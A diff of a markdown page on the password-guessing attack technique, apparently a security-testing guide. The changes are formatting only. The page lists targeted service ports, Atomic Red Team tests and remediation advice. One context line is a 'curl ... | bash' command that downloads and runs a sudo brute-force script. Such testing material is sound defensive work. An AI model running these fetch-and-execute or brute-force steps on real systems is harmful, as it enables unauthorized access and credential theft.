@@ -70,23 +70,23 @@ severity_boost:
 
 Adversaries with no prior knowledge of legitimate credentials within the system or environment may guess passwords to attempt access to accounts. Without knowledge of the password for an account, an adversary may opt to systematically guess the password using a repetitive or iterative mechanism. An adversary may guess login credentials without prior knowledge of system or environment passwords during an operation by using a list of common passwords. Password guessing may or may not take into account the target's policies on password complexity or use policies that may lock accounts out after a number of failed attempts.
 
-Guessing passwords can be a risky option because it could cause numerous authentication failures and account lockouts, depending on the organization's login failure policies. 
+Guessing passwords can be a risky option because it could cause numerous authentication failures and account lockouts, depending on the organization's login failure policies.
 
 Typically, management services over commonly used ports are used when guessing passwords. Commonly targeted services include the following:
 
-* SSH (22/TCP)
-* Telnet (23/TCP)
-* FTP (21/TCP)
-* NetBIOS / SMB / Samba (139/TCP & 445/TCP)
-* LDAP (389/TCP)
-* Kerberos (88/TCP)
-* RDP / Terminal Services (3389/TCP)
-* HTTP/HTTP Management Services (80/TCP & 443/TCP)
-* MSSQL (1433/TCP)
-* Oracle (1521/TCP)
-* MySQL (3306/TCP)
-* VNC (5900/TCP)
-* SNMP (161/UDP and 162/TCP/UDP)
+- SSH (22/TCP)
+- Telnet (23/TCP)
+- FTP (21/TCP)
+- NetBIOS / SMB / Samba (139/TCP & 445/TCP)
+- LDAP (389/TCP)
+- Kerberos (88/TCP)
+- RDP / Terminal Services (3389/TCP)
+- HTTP/HTTP Management Services (80/TCP & 443/TCP)
+- MSSQL (1433/TCP)
+- Oracle (1521/TCP)
+- MySQL (3306/TCP)
+- VNC (5900/TCP)
+- SNMP (161/UDP and 162/TCP/UDP)
 
 In addition to management services, adversaries may "target single sign-on (SSO) and cloud-based applications utilizing federated authentication protocols," as well as externally facing email applications, such as Office 365.. Further, adversaries may abuse network device interfaces (such as `wlanAPI`) to brute force accessible wifi-router(s) via wireless authentication protocols.
 
@@ -171,12 +171,13 @@ cd "PathToAtomicsFolder\..\ExternalPayloads"
 ```
 
 **Dependencies:**
+
 - kerbrute.exe must exist in PathToAtomicsFolder\..\ExternalPayloads
 - bruteuser.txt must exist in PathToAtomicsFolder\..\ExternalPayloads
 
 ### Atomic Test 5: SUDO Brute Force - Debian
 
-An adversary may find themselves on a box (e.g. via ssh key auth, with no password) with a user that has sudo'ers privileges, but they do not know the users password. Normally, failed attempts to access root will not cause the root account to become locked, to prevent denial-of-service. This functionality enables an attacker to undertake a local brute force password guessing attack without locking out the root user. 
+An adversary may find themselves on a box (e.g. via ssh key auth, with no password) with a user that has sudo'ers privileges, but they do not know the users password. Normally, failed attempts to access root will not cause the root account to become locked, to prevent denial-of-service. This functionality enables an attacker to undertake a local brute force password guessing attack without locking out the root user.
 
 This test creates the "art" user with a password of "password123", logs in, downloads and executes the sudo_bruteforce.sh which brute force guesses the password, then deletes the user
 
@@ -189,8 +190,8 @@ su -c "cd /tmp; curl -s #{remote_url} | bash" art
 ```
 
 **Dependencies:**
-- Check if running on a Debian based machine.
 
+- Check if running on a Debian based machine.
 
 ### Manual Testing
 
@@ -205,35 +206,36 @@ If Atomic Red Team tests are not applicable, manually verify the technique by:
 ## Remediation Guide
 
 ### M1051 Update Software
+
 Upgrade management services to the latest supported and compatible version. Specifically, any version providing increased password complexity or policy enforcement preventing default or weak passwords.
 
 ### M1032 Multi-factor Authentication
+
 Use multi-factor authentication. Where possible, also enable multi-factor authentication on externally facing services.
 
 ### M1027 Password Policies
+
 Refer to NIST guidelines when creating password policies.
 
 ### M1036 Account Use Policies
-Set account lockout policies after a certain number of failed login attempts to prevent passwords from being guessed. Too strict a policy may create a denial of service condition and render environments un-usable, with all accounts used in the brute force being locked-out. Use conditional access policies to block logins from non-compliant devices or from outside defined organization IP ranges. Consider blocking risky authentication requests, such as those originating from anonymizing services/proxies.
 
+Set account lockout policies after a certain number of failed login attempts to prevent passwords from being guessed. Too strict a policy may create a denial of service condition and render environments un-usable, with all accounts used in the brute force being locked-out. Use conditional access policies to block logins from non-compliant devices or from outside defined organization IP ranges. Consider blocking risky authentication requests, such as those originating from anonymizing services/proxies.
 
 ## Detection
 
 ### Password Guessing via Multi-Source Authentication Failure Correlation
 
-
 ## Risk Assessment
 
-| Finding | Severity | Impact |
-| ------- | -------- | ------ |
-| Password Guessing technique applicable | High | Credential Access |
+| Finding                                | Severity | Impact            |
+| -------------------------------------- | -------- | ----------------- |
+| Password Guessing technique applicable | High     | Credential Access |
 
 ## CWE Categories
 
-| CWE ID | Title |
-| ------ | ----- |
+| CWE ID  | Title                                |
+| ------- | ------------------------------------ |
 | CWE-522 | Insufficiently Protected Credentials |
-
 
 ## References
 
